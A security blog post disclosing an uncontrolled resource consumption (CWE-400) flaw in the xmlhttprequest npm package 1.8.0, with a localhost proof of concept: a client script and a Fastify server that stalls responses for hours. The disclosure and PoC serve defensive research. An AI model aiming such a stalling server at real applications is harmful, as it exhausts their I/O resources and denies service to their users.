---
title: Disclosing uncontrolled resource consumption in xmlhttprequest library
description: >-
  proof-of-concept showing a denial of service vulnerability in a Node.js web server if it uses the xmlhttprequest library to make outgoing HTTP requests
date: '2023-04-16'
pubDate: '2023-04-16'
categories: []
keywords: []
draft: false
tags: ["security", "vulnerability", "advisory", "cve", "xmlhttprequest", "denial of service", "dos", "uncontrolled resource consumption"]
slug: disclosing-uncontrolled-resource-consumption-in-xmlhttprequest-library
image: ~/assets/images/blog/photo-1553987084-4c3aebbc686e.jpg
---

## What is the `xmlhttprequest` npm package?

The `xmlhttprequest` npm package is an open-source library for Node.js server-side projects to use a familiar browser-like HTTP client. It is technically a wrapper around the `http` and `https` modules in Node.js.

Its purpose is to provide a familiar API to Node.js developers who are used to using the `XMLHttpRequest` object in the browser. These days, most developers use the `fetch` API in the browser, but `xmlhttprequest` is still a popular library for Node.js developers.

## Disclosing a vulnerability in `xmlhttprequest`

In August 2022, I discovered several security issues with the library and with the help of my Snyk security analysts colleagues I reached out to the maintainer of the `xmlhttprequest` npm package to report a vulnerability in the library. The maintainer was responsive but did not consider this security report as an actual vulnerability to be recognized or fixed.

I then decided to disclose the vulnerability publicly and share my findings here.

## Uncontrolled resource consumption in xmlhttprequest@1.8.0

Observations:
- It was last published 7 years ago in 2015 with version 1.8.0
- It has 1,814,290 weekly downloads from npm

`xmlhttprequest` code and registry resources: 
 * [Project's GitHub source code](https://github.com/driverdan/node-XMLHttpRequest)
 * [Project's npm package](https://www.npmjs.com/package/xmlhttprequest)

### Background on exploitation

The HTTP client library fails to implement any sort of timeout controls for outgoing requests,
and as such it is possible for attackers who control the URL provided to `xmlhttprequest` to
set the server to delay requests for a considerable long time (infinity) through which the 
HTTP connection will hang and never terminate.

If attackers are able to force an application to perform several such outgoing requests then
they could saturate I/O resources on the running Node.js runtime.

This vulnerability is classified as a [CWE-400](https://cwe.mitre.org/data/definitions/400.html) uncontrolled resource consumption issue.

### Proof of Concept exploit

Install these two npm packages:
1. Install `xmlhttprequest@1.8.0` which is the latest version of this package. We will use it for a client web application.
2. Install `fastify` to be used as the server that is in control of the attacker.

For the vulnerable `xmlhttprequest` library, create a `client.js` file as follows:

```js
var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
var xhr = new XMLHttpRequest();

xhr.open("GET", "http://localhost:3001/hello");
xhr.send();
```

For our attacker-controlled web server, create the following `server.js`:

```js
const util = require('util')
const fastify = require('fastify')({ logger: true })

const delay = util.promisify(setTimeout)

fastify.get('/hello', async (request, reply) => {
  return delay(11110000).then(() => reply.redirect('/two'))
})

const start = async () => {
  try {
    await fastify.listen({ port: 3001 })
  } catch (err) {
    fastify.log.error(err)
    process.exit(1)
  }
}
start()
```

Run the server and when it's ready to accept new connections, run the `client.js` code
which sends a request.

Observe that the request never ends (timed at 29 minutes before I killed it on my local
environment).
